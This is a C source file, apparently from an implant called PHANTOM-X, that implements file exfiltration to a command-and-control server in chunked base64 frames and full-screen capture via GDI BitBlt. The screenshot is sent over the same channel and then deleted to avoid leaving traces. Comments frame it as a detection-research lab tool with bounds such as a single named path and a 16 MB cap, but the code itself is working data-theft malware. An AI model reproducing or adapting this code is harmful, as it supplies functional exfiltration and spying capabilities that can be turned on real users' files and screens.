/* ================================================================== */
/* PHANTOM-X :: file transfer and screen capture capabilities          */
/* ================================================================== */
/*                                                                        */
/* WHAT THESE ARE                                                        */
/*     Two capabilities that every real data-theft tool has, and that   */
/*     every detection engineer therefore needs a rule for:             */
/*                                                                        */
/*       file download    T1041 -- exfiltration over the C2 channel       */
/*                        T1105 -- ingress tool transfer                 */
/*                                                                        */
/*       screen capture   T1113 -- screen capture                        */
/*                                                                        */
/*     Both are implemented so that the lab can MEASURE them: what the   */
/*     telemetry looks like, which rules catch them, and which rules    */
/*     stop catching them once the channel is encrypted.                */
/*                                                                        */
/* THE BOUNDS, AND WHY THEY ARE HERE                                  */
/*     The download takes ONE path that the operator named. There is    */
/*     no globbing, no directory recursion, and no searching for        */
/*     credential stores or browser databases.                           */
/*                                                                        */
/*     That is not a limitation on the research. A real infostealer      */
/*     reads specific files -- an SSH key, a browser's Login Data, a    */
/*     cloud credential file -- and the telemetry is the same either     */
/*     way: a process reading a file it has no reason to read, and the  */
/*     volume leaving over the network. What a globbing implementation   */
/*     adds is the ability to sweep a disk, which is a step further      */
/*     from "a lab instrument" than the detection question requires.    */
/*                                                                        */
/*     The screenshot is the whole screen of the machine the payload    */
/*     runs on -- which, in this lab, is the lab VM.                     */
/*                                                                        */
/* WHAT THEY SEND                                                        */
/*     The bytes go to the C2 in CHUNK frames, exactly as the rest of   */
/*     the protocol does. In the baseline arm they are readable on the  */
/*     wire, which is what makes the "a rule that greps for the canary  */
/*     content" case work -- and in the encrypted arm they are not,      */
/*     which is what makes that rule's failure a finding.                */
/* ================================================================== */

#include "px_config.h"

#if PX_FILE_TRANSFER || PX_SCREENSHOT

#include "px_strings.h"
#include "px_variant.h"

/* The raw bytes per chunk.
 *
 * Sixteen kilobytes becomes about twenty-two kilobytes of base64, which
 * is a line the protocol and the C2 server both handle comfortably. */
#define PX_CHUNK_RAW 16384

/* The largest file the download will transfer.
 *
 * A bound, because the capability is here to be MEASURED, not to be
 * used to pull a disk image off a machine. */
#define PX_MAX_TRANSFER (16 * 1024 * 1024)

/* The path to the screen capture. It is written next to the payload and
 * then transferred through the same path as any other file, so the
 * transfer telemetry is identical. */
#define PX_SHOT_NAME "px_lab_screen.bmp"

/* ------------------------------------------------------------------ */
/* Sending one chunk                                                   */
/* ------------------------------------------------------------------ */

/* Send one chunk of a transfer.
 *
 * The wire format is:
 *
 *     CHUNK|<cmd_id>|<sequence>|<total chunks>|<base64>
 *
 * and the last chunk is followed by:
 *
 *     DONE|<cmd_id>|<total bytes>
 *
 * The size is reported by the payload; the server computes the hash of
 * what it received, because a hash the payload computes is a hash of
 * something the payload chose. The server's is a hash of what actually
 * arrived. */
static int px_send_chunk(PX_SOCKET sock, fn_send p_send,
                          const char *cmd_id, unsigned int seq,
                          unsigned int total, const unsigned char *data,
                          unsigned int len)
{
    char *b64;
    static char line[PX_MAX_LINE];
    px_size_t n;

    b64 = b64_encode(data, (px_size_t)len);
    if (!b64)
        return -1;

    n = px_fmt(line, sizeof(line), "CHUNK|%s|%lu|%lu|%s",
               cmd_id, (unsigned long)seq, (unsigned long)total, b64);
    HeapFree(GetProcessHeap(), 0, b64);
    if (n == 0)
        return -1;

    return send_line(sock, line, (int)n, p_send);
}

/* Send the DONE marker. */
static int px_send_done(PX_SOCKET sock, fn_send p_send, const char *cmd_id,
                         unsigned long total_bytes)
{
    char line[256];
    px_size_t n = px_fmt(line, sizeof(line), "DONE|%s|%lu",
                          cmd_id, total_bytes);
    if (n == 0)
        return -1;
    return send_line(sock, line, (int)n, p_send);
}

/* ------------------------------------------------------------------ */
/* File download                                                       */
/* ------------------------------------------------------------------ */

/* Download a file to the C2.
 *
 * Returns 0 on success. The file is read in chunks, so a large file
 * does not have to fit in memory. */
int px_file_download(PX_SOCKET sock, fn_send p_send, const char *cmd_id,
                     const char *path)
{
    HANDLE h;
    DWORD size_lo = 0, size_hi = 0;
    unsigned long total;
    unsigned int chunks;
    unsigned int seq = 0;
    static unsigned char buf[PX_CHUNK_RAW];
    DWORD got = 0;

    if (!path || !path[0])
        return -1;

    h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return -1;

    size_lo = GetFileSize(h, &size_hi);
    if (size_lo == INVALID_FILE_SIZE && size_hi == 0) {
        CloseHandle(h);
        return -1;
    }

    total = ((unsigned long)size_hi << 32) | (unsigned long)size_lo;
    if (total == 0) {
        /* An empty file is still a completed transfer. */
        px_send_done(sock, p_send, cmd_id, 0);
        CloseHandle(h);
        return 0;
    }
    if (total > PX_MAX_TRANSFER) {
        CloseHandle(h);
        return -1;
    }

    chunks = (unsigned int)((total + PX_CHUNK_RAW - 1) / PX_CHUNK_RAW);

    for (;;) {
        if (!ReadFile(h, buf, (DWORD)PX_CHUNK_RAW, &got, NULL))
            break;
        if (got == 0)
            break;
        if (px_send_chunk(sock, p_send, cmd_id, seq, chunks, buf, got) != 0) {
            CloseHandle(h);
            return -1;
        }
        seq++;
    }

    CloseHandle(h);
    px_send_done(sock, p_send, cmd_id, total);
    return 0;
}

/* ------------------------------------------------------------------ */
/* Screen capture                                                      */
/* ------------------------------------------------------------------ */

#if PX_SCREENSHOT

/* Capture the screen into a BMP file next to the payload.
 *
 * WHY A BMP AND NOT A PNG
 *     PNG needs a compressor, and a compressor is a lot of code to carry
 *     for no research value. A BMP is the raw pixels, and the DETECTION
 *     SURFACE is identical either way: the same GDI calls, the same file
 *     appearing, the same bytes leaving.
 *
 * THE CAPTURE
 *     GetDC on the desktop, a compatible memory DC, a DIB section, and
 *     one BitBlt. That is the sequence every screen-capture tool uses,
 *     and it is what the rules key on.
 *
 * THE ROW ORDER
 *     A DIB section created with a NEGATIVE height is top-down, which is
 *     what BitBlt produces naturally. A BMP file on disk is defined as
 *     bottom-up, so the rows are written in reverse and the file header
 *     carries a positive height. Writing the capture out as-is with a
 *     negative height produces a file most viewers show upside down. */
static int px_capture_screen(const char *out_path)
{
    HDC hdc_screen = NULL;
    HDC hdc_mem = NULL;
    HBITMAP hbm = NULL, hbm_old = NULL;
    BITMAPINFO bi;
    void *bits = NULL;
    int w, h;
    HANDLE out = INVALID_HANDLE_VALUE;
    DWORD written = 0;
    BITMAPFILEHEADER fh;
    int ok = 0;

    hdc_screen = GetDC(NULL);
    if (!hdc_screen)
        return -1;

    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);
    if (w <= 0 || h <= 0)
        goto done;

    hdc_mem = CreateCompatibleDC(hdc_screen);
    if (!hdc_mem)
        goto done;

    memset(&bi, 0, sizeof(bi));
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = w;
    /* Negative height: top-down, which is what BitBlt writes. */
    bi.bmiHeader.biHeight = -h;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32;
    bi.bmiHeader.biCompression = BI_RGB;

    hbm = CreateDIBSection(hdc_screen, &bi, DIB_RGB_COLORS, &bits, NULL, 0);
    if (!hbm || !bits)
        goto done;

    hbm_old = (HBITMAP)SelectObject(hdc_mem, hbm);
    if (!BitBlt(hdc_mem, 0, 0, w, h, hdc_screen, 0, 0, SRCCOPY))
        goto done;

    out = CreateFileA(out_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                      FILE_ATTRIBUTE_NORMAL, NULL);
    if (out == INVALID_HANDLE_VALUE)
        goto done;

    /* The file header, then the info header, then the pixels bottom-up. */
    memset(&fh, 0, sizeof(fh));
    fh.bfType = 0x4D42;                    /* 'BM' */
    fh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    fh.bfSize = fh.bfOffBits + (DWORD)w * (DWORD)h * 4;
    if (!WriteFile(out, &fh, (DWORD)sizeof(fh), &written, NULL))
        goto done;

    {
        /* The on-disk header carries a POSITIVE height, so the file is a
         * normal bottom-up BMP. */
        BITMAPINFOHEADER ih = bi.bmiHeader;
        ih.biHeight = h;
        if (!WriteFile(out, &ih, (DWORD)sizeof(ih), &written, NULL))
            goto done;
    }

    {
        /* Write the rows in reverse: the capture is top-down and the
         * file is bottom-up. */
        unsigned char *row = (unsigned char *)bits;
        unsigned int stride = (unsigned int)w * 4;
        int y;
        for (y = h - 1; y >= 0; y--) {
            if (!WriteFile(out, row + (size_t)y * stride, stride, &written, NULL))
                goto done;
        }
    }

    ok = 1;

done:
    if (out != INVALID_HANDLE_VALUE)
        CloseHandle(out);
    if (hbm_old)
        SelectObject(hdc_mem, hbm_old);
    if (hbm)
        DeleteObject(hbm);
    if (hdc_mem)
        DeleteDC(hdc_mem);
    if (hdc_screen)
        ReleaseDC(NULL, hdc_screen);
    return ok ? 0 : -1;
}

/* Capture the screen and transfer it.
 *
 * The capture is written next to the payload and then transferred through
 * the SAME code path as any other file, so the transfer telemetry is
 * identical to a download. That matters: a detection that catches the
 * download catches the screenshot too, which is the truth about how these
 * tools behave.
 */
int px_screen_capture(PX_SOCKET sock, fn_send p_send, const char *cmd_id)
{
    char path[MAX_PATH];
    char dir[MAX_PATH];
    char *slash;
    int rc;

    /* Next to the running image. */
    if (!GetModuleFileNameA(NULL, dir, MAX_PATH))
        return -1;
    slash = px_strrchr(dir, '\\');
    if (slash) {
        slash[1] = '\0';
    } else {
        px_strcpy(dir, ".\\", MAX_PATH);
    }
    px_strcpy(path, dir, MAX_PATH);
    {
        px_size_t l = px_strlen(path);
        px_strcpy(path + l, PX_SHOT_NAME, MAX_PATH - l);
    }

    if (px_capture_screen(path) != 0)
        return -1;

    rc = px_file_download(sock, p_send, cmd_id, path);

    /* The capture is removed afterwards. The point of the capability is
     * the behaviour it produces, not the file it leaves behind -- and a
     * screenshot sitting next to the payload is a thing a defender would
     * find by accident rather than by looking. */
    DeleteFileA(path);

    return rc;
}

#endif /* PX_SCREENSHOT */

#endif /* PX_FILE_TRANSFER || PX_SCREENSHOT */
